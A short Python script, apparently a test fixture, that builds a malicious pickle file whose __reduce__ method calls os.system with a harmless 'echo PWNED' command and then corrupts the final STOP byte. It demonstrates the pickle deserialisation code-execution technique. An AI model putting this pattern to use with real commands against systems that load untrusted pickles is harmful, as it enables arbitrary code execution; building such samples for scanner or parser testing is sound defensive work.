import os, pickle

class Evil:
    def __reduce__(self):
        return (os.system, ("echo PWNED",))

data = pickle.dumps(Evil(), protocol=0)
open("evil.pkl", "wb").write(data[:-1] + b"\x00")  # replace the final STOP byte with junk
